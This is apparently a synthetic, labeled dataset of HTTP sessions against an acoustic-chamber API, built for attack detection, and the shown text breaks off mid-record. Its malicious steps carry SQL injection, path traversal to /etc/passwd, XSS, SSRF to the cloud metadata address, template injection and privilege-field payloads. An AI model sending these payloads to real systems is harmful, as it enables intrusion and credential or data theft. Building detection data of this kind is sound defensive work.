@@ -1,0 +1,5022 @@
+[
+    {
+      "session_id": "sess101",
+      "client_ip": "192.168.1.10",
+      "steps": [
+        {
+          "id": "sess101-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {"Accept": "application/json"},
+          "body": null,
+          "note": "The client checks the health status of the API."
+        },
+        {
+          "id": "sess101-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "acoustic_engineer", "password": "securepassword123"},
+          "note": "The client authenticates to obtain a bearer token."
+        },
+        {
+          "id": "sess101-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": 10},
+          "headers": {"Authorization": "Bearer token123"},
+          "body": null,
+          "note": "The client lists existing acoustic chambers."
+        },
+        {
+          "id": "sess101-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-001",
+          "query": {},
+          "headers": {"Authorization": "Bearer token123"},
+          "body": null,
+          "note": "The client retrieves details for a primary chamber."
+        },
+        {
+          "id": "sess101-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-002",
+          "query": {},
+          "headers": {"Authorization": "Bearer token123"},
+          "body": null,
+          "note": "The client checks a second plausible object id it owns."
+        }
+      ]
+    },
+    {
+      "session_id": "sess102",
+      "client_ip": "10.0.0.15",
+      "steps": [
+        {
+          "id": "sess102-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {"Accept": "application/json"},
+          "body": null,
+          "note": "The client lists available acoustic dampening materials."
+        },
+        {
+          "id": "sess102-s02",
+          "label": "suspicious_benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json", "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"},
+          "body": {"username": "user's_alias", "password": "password"},
+          "note": "The client uses an old browser header and an apostrophe in username."
+        },
+        {
+          "id": "sess102-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer token456"},
+          "body": null,
+          "note": "The client lists chambers after token exchange."
+        },
+        {
+          "id": "sess102-s04",
+          "label": "benign",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer token456", "Content-Type": "application/json"},
+          "body": {"name": "Test Chamber Alpha", "volume_cubic_meters": 45.5},
+          "note": "The client creates a new chamber blueprint."
+        }
+      ]
+    },
+    {
+      "session_id": "sess103",
+      "client_ip": "172.16.25.4",
+      "steps": [
+        {
+          "id": "sess103-s01",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "10' OR '1'='1"},
+          "headers": {"Authorization": "Bearer token789"},
+          "body": null,
+          "note": "The client attempts a query injection via the limit parameter."
+        },
+        {
+          "id": "sess103-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client verifies system health following the request."
+        },
+        {
+          "id": "sess103-s03",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "tester", "password": "secretpassword"},
+          "note": "The client requests authentication credentials."
+        },
+        {
+          "id": "sess103-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-100",
+          "query": {},
+          "headers": {"Authorization": "Bearer token789"},
+          "body": null,
+          "note": "The client views a specific chamber item."
+        }
+      ]
+    },
+    {
+      "session_id": "sess104",
+      "client_ip": "192.168.2.55",
+      "steps": [
+        {
+          "id": "sess104-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks system availability."
+        },
+        {
+          "id": "sess104-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "architect", "password": "mypassword"},
+          "note": "The client logs in to obtain a bearer token."
+        },
+        {
+          "id": "sess104-s03",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/cham-999/../../admin/config",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client attempts a directory traversal attack on the path."
+        },
+        {
+          "id": "sess104-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client returns to normal listing of chambers."
+        },
+        {
+          "id": "sess104-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-010",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenABC"},
+          "body": null,
+          "note": "The client inspects a standard chamber."
+        }
+      ]
+    },
+    {
+      "session_id": "sess105",
+      "client_ip": "10.10.10.5",
+      "steps": [
+        {
+          "id": "sess105-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "operator", "password": "password123"},
+          "note": "The client authenticates to the system."
+        },
+        {
+          "id": "sess105-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer token999"},
+          "body": null,
+          "note": "The client requests user chambers."
+        },
+        {
+          "id": "sess105-s03",
+          "label": "suspicious_benign",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer token999", "Content-Type": "application/json"},
+          "body": {"name": "Studio A\nthat continues on a new line", "volume_cubic_meters": 30.0, "legacy_field": "old_val"},
+          "note": "The client includes a sentence-continuing newline and an extra field."
+        },
+        {
+          "id": "sess105-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-555",
+          "query": {},
+          "headers": {"Authorization": "Bearer token999"},
+          "body": null,
+          "note": "The client views the newly created chamber details."
+        }
+      ]
+    },
+    {
+      "session_id": "sess106",
+      "client_ip": "172.20.10.8",
+      "steps": [
+        {
+          "id": "sess106-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "sound_guy", "password": "pwd"},
+          "note": "The client performs login."
+        },
+        {
+          "id": "sess106-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client fetches chambers list."
+        },
+        {
+          "id": "sess106-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ", "Content-Type": "application/json"},
+          "body": {"name": "Normal Chamber", "volume_cubic_meters": 50.0, "role": "admin"},
+          "note": "The client injects an unauthorized privilege field in the request body."
+        },
+        {
+          "id": "sess106-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-011",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenXYZ"},
+          "body": null,
+          "note": "The client checks an owned chamber."
+        }
+      ]
+    },
+    {
+      "session_id": "sess107",
+      "client_ip": "192.168.5.20",
+      "steps": [
+        {
+          "id": "sess107-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client browses raw materials."
+        },
+        {
+          "id": "sess107-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "analyst", "password": "password789"},
+          "note": "The client obtains a token."
+        },
+        {
+          "id": "sess107-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess107-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-022",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client checks chamber 022."
+        },
+        {
+          "id": "sess107-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-023",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenDEF"},
+          "body": null,
+          "note": "The client checks a second owned chamber, cham-023."
+        }
+      ]
+    },
+    {
+      "session_id": "sess108",
+      "client_ip": "10.20.30.40",
+      "steps": [
+        {
+          "id": "sess108-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "tester2", "password": "abc"},
+          "note": "The client logs into the platform."
+        },
+        {
+          "id": "sess108-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI", "Content-Type": "application/json"},
+          "body": {"name": "<script>alert(1)</script>", "volume_cubic_meters": 12.0},
+          "note": "The client passes a browser-executed code payload in the name field."
+        },
+        {
+          "id": "sess108-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenGHI"},
+          "body": null,
+          "note": "The client lists chambers after the submission."
+        },
+        {
+          "id": "sess108-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client pings the health endpoint."
+        }
+      ]
+    },
+    {
+      "session_id": "sess109",
+      "client_ip": "192.168.10.100",
+      "steps": [
+        {
+          "id": "sess109-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess109-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "engineer_x", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess109-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client views chambers."
+        },
+        {
+          "id": "sess109-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-001/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 20.0, "callback_url": "http://127.0.0.1/internal"},
+          "note": "The client specifies an internal address in a callback field."
+        },
+        {
+          "id": "sess109-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-001/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenJKL"},
+          "body": null,
+          "note": "The client checks simulation results."
+        }
+      ]
+    },
+    {
+      "session_id": "sess110",
+      "client_ip": "10.50.60.70",
+      "steps": [
+        {
+          "id": "sess110-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user10", "password": "password10"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess110-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess110-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO", "Content-Type": "application/json"},
+          "body": {"name": "${7*7}", "volume_cubic_meters": 15.0},
+          "note": "The client injects a template expression inside the name field."
+        },
+        {
+          "id": "sess110-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-888",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenMNO"},
+          "body": null,
+          "note": "The client views an existing chamber."
+        }
+      ]
+    },
+    {
+      "session_id": "sess111",
+      "client_ip": "172.30.40.50",
+      "steps": [
+        {
+          "id": "sess111-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client pinds health endpoint."
+        },
+        {
+          "id": "sess111-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user11", "password": "pwd"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess111-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNlcg...", "volume_cubic_meters": 20.0},
+          "note": "The client sends a serialized object payload in the name field."
+        },
+        {
+          "id": "sess111-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess111-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-012",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenPQR"},
+          "body": null,
+          "note": "The client views chamber cham-012."
+        }
+      ]
+    },
+    {
+      "session_id": "sess112",
+      "client_ip": "192.168.100.5",
+      "steps": [
+        {
+          "id": "sess112-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user12", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess112-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU", "Content-Type": "application/json"},
+          "body": {"name": "Test Chamber\n[2026-10-28 10:00:00] INFO: Log stamp inserted", "volume_cubic_meters": 33.3},
+          "note": "The client injects a newline plus a log stamp inside the name field."
+        },
+        {
+          "id": "sess112-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client lists user chambers."
+        },
+        {
+          "id": "sess112-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-013",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenSTU"},
+          "body": null,
+          "note": "The client reviews chamber details."
+        }
+      ]
+    },
+    {
+      "session_id": "sess113",
+      "client_ip": "10.0.1.99",
+      "steps": [
+        {
+          "id": "sess113-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess113-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user13", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess113-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess113-s04",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/chambers/other-user-cham-999",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "Data error: relabeled from malicious. One authenticated GET of a chamber id. The words in the id are not evidence that the chamber belongs to someone else."
+        },
+        {
+          "id": "sess113-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-014",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenVWX"},
+          "body": null,
+          "note": "The client checks their own chamber."
+        }
+      ]
+    },
+    {
+      "session_id": "sess114",
+      "client_ip": "172.16.50.2",
+      "steps": [
+        {
+          "id": "sess114-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user14", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess114-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA"},
+          "body": null,
+          "note": "The client fetches chambers."
+        },
+        {
+          "id": "sess114-s03",
+          "label": "benign",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenYZA", "Content-Type": "application/json"},
+          "body": {"name": "Acoustic Lab", "volume_cubic_meters": 60.0},
+          "note": "The client creates a new chamber."
+        },
+        {
+          "id": "sess114-s04",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/chambers/cham-015",
+          "query": {"filter": "unspecified_param"},
+          "headers": {"Authorization": "Bearer tokenYZA", "X-Custom-Header": "legacy_val"},
+          "body": null,
+          "note": "The client passes a harmless extra query parameter and custom header."
+        }
+      ]
+    },
+    {
+      "session_id": "sess115",
+      "client_ip": "192.168.3.45",
+      "steps": [
+        {
+          "id": "sess115-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health status."
+        },
+        {
+          "id": "sess115-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user15", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess115-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess115-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-015",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client retrieves chamber 015."
+        },
+        {
+          "id": "sess115-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-016",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenBCD"},
+          "body": null,
+          "note": "The client checks a second owned object ID, cham-016."
+        }
+      ]
+    },
+    {
+      "session_id": "sess116",
+      "client_ip": "10.10.20.30",
+      "steps": [
+        {
+          "id": "sess116-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user16", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess116-s02",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {"limit": "5 UNION SELECT null,null--"},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client performs a query injection in limit."
+        },
+        {
+          "id": "sess116-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client resumes normal chamber listing."
+        },
+        {
+          "id": "sess116-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-017",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenEFG"},
+          "body": null,
+          "note": "The client views an owned chamber."
+        }
+      ]
+    },
+    {
+      "session_id": "sess117",
+      "client_ip": "172.25.10.5",
+      "steps": [
+        {
+          "id": "sess117-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/materials",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client lists materials."
+        },
+        {
+          "id": "sess117-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user17", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess117-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess117-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/admin/metrics",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client requests an admin path not in the contract."
+        },
+        {
+          "id": "sess117-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-018",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenHIJ"},
+          "body": null,
+          "note": "The client resumes normal operations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess118",
+      "client_ip": "192.168.4.12",
+      "steps": [
+        {
+          "id": "sess118-s01",
+          "label": "suspicious_benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {"User-Agent": "Mozilla/5.0 (Windows NT; old_browser)"},
+          "body": null,
+          "note": "The client uses an old browser signature string."
+        },
+        {
+          "id": "sess118-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user18", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess118-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess118-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-019",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenKLM"},
+          "body": null,
+          "note": "The client views chamber cham-019."
+        }
+      ]
+    },
+    {
+      "session_id": "sess119",
+      "client_ip": "10.5.5.5",
+      "steps": [
+        {
+          "id": "sess119-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user19", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess119-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess119-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP", "Content-Type": "application/json"},
+          "body": {"name": "Lab", "volume_cubic_meters": 10.0, "is_admin": true},
+          "note": "The client injects an unallowed privilege field in the body."
+        },
+        {
+          "id": "sess119-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-020",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenNOP"},
+          "body": null,
+          "note": "The client checks chamber cham-020."
+        }
+      ]
+    },
+    {
+      "session_id": "sess120",
+      "client_ip": "172.18.20.90",
+      "steps": [
+        {
+          "id": "sess120-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess120-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user20", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess120-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess120-s04",
+          "label": "malicious",
+          "method": "GET",
+          "path": "/chambers/../../etc/passwd",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client performs directory traversal in the path."
+        },
+        {
+          "id": "sess120-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-021",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenQRS"},
+          "body": null,
+          "note": "The client inspects chamber cham-021."
+        }
+      ]
+    },
+    {
+      "session_id": "sess121",
+      "client_ip": "192.168.6.77",
+      "steps": [
+        {
+          "id": "sess121-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user21", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess121-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess121-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV", "Content-Type": "application/json"},
+          "body": {"name": "<svg/onload=alert(document.domain)>", "volume_cubic_meters": 25.0},
+          "note": "The client passes browser-executed code in the name field."
+        },
+        {
+          "id": "sess121-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-022",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenTUV"},
+          "body": null,
+          "note": "The client views chamber cham-022."
+        }
+      ]
+    },
+    {
+      "session_id": "sess122",
+      "client_ip": "10.11.12.13",
+      "steps": [
+        {
+          "id": "sess122-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess122-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user22", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess122-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess122-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers/cham-022/simulate",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY", "Content-Type": "application/json"},
+          "body": {"ambient_temperature_celsius": 22.0, "webhook": "http://169.254.169.254/latest"},
+          "note": "The client references an internal cloud metadata address."
+        },
+        {
+          "id": "sess122-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-022/simulations",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenWXY"},
+          "body": null,
+          "note": "The client fetches simulations."
+        }
+      ]
+    },
+    {
+      "session_id": "sess123",
+      "client_ip": "172.19.3.4",
+      "steps": [
+        {
+          "id": "sess123-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user23", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess123-s02",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess123-s03",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB", "Content-Type": "application/json"},
+          "body": {"name": "{{config.items()}}", "volume_cubic_meters": 30.0},
+          "note": "The client injects a template expression in the name field."
+        },
+        {
+          "id": "sess123-s04",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-023",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenZAB"},
+          "body": null,
+          "note": "The client checks chamber cham-023."
+        }
+      ]
+    },
+    {
+      "session_id": "sess124",
+      "client_ip": "192.168.7.88",
+      "steps": [
+        {
+          "id": "sess124-s01",
+          "label": "benign",
+          "method": "GET",
+          "path": "/health",
+          "query": {},
+          "headers": {},
+          "body": null,
+          "note": "The client checks health."
+        },
+        {
+          "id": "sess124-s02",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user24", "password": "password"},
+          "note": "The client authenticates."
+        },
+        {
+          "id": "sess124-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenCDE"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess124-s04",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenCDE", "Content-Type": "application/json"},
+          "body": {"name": "rO0ABXNyACdjb20...", "volume_cubic_meters": 18.0},
+          "note": "The client sends a serialized object payload."
+        },
+        {
+          "id": "sess124-s05",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers/cham-024",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenCDE"},
+          "body": null,
+          "note": "The client views chamber cham-024."
+        }
+      ]
+    },
+    {
+      "session_id": "sess125",
+      "client_ip": "10.22.33.44",
+      "steps": [
+        {
+          "id": "sess125-s01",
+          "label": "benign",
+          "method": "POST",
+          "path": "/auth/token",
+          "query": {},
+          "headers": {"Content-Type": "application/json"},
+          "body": {"username": "user25", "password": "password"},
+          "note": "The client logs in."
+        },
+        {
+          "id": "sess125-s02",
+          "label": "malicious",
+          "method": "POST",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH", "Content-Type": "application/json"},
+          "body": {"name": "Chamber\n[ERROR] 2026-10-28 Security breach detected", "volume_cubic_meters": 40.0},
+          "note": "The client passes a newline and a log stamp in the name field."
+        },
+        {
+          "id": "sess125-s03",
+          "label": "benign",
+          "method": "GET",
+          "path": "/chambers",
+          "query": {},
+          "headers": {"Authorization": "Bearer tokenFGH"},
+          "body": null,
+          "note": "The client lists chambers."
+        },
+        {
+          "id": "sess125-s04",
+          "label": "benign",
